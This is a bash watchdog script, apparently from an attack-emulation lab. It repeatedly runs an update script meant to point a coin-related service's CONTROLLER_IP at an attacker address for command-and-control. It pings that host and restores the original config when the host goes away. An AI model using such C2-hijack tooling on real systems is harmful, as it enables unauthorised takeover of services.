#!/bin/bash
UPDATE_SCRIPT="/coinworm/update_cfg.sh"
RESTORE_SCRIPT="/coinworm/restore_cfg.sh"
CHECK_IP="198.18.14.2"
TARGET_IP="198.18.14.2"
CFG_PATH="/coin-forge/cfg.json"
SLEEP_INTERVAL=10

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

while true; do
    # Always try to update
    bash "$UPDATE_SCRIPT"

    # Check if current cfg has the attacker IP (update success means attacker control)
    CURRENT_IP=$(grep -m1 '"CONTROLLER_IP"' "$CFG_PATH" | sed -r 's/.*"CONTROLLER_IP"[[:space:]]*:[[:space:]]*"([^"]+)".*/\1/')
    
    if [[ "$CURRENT_IP" == "$TARGET_IP" ]]; then
        # Now C2 control is active, perform ping check
        if ! ping -c 3 -W 2 "$CHECK_IP" > /dev/null 2>&1; then
            log "Attacker $CHECK_IP unreachable. Restoring cfg.json config."
            bash "$RESTORE_SCRIPT"
            log "Restore completed. Exiting watchdog."
            exit 0
        else
            log "Attacker $CHECK_IP reachable. Continuing monitor."
        fi
    else
        log "Awaiting INITIATE_ATTACK=true or controller IP update. Skipping ping."
    fi

    sleep "$SLEEP_INTERVAL"
done
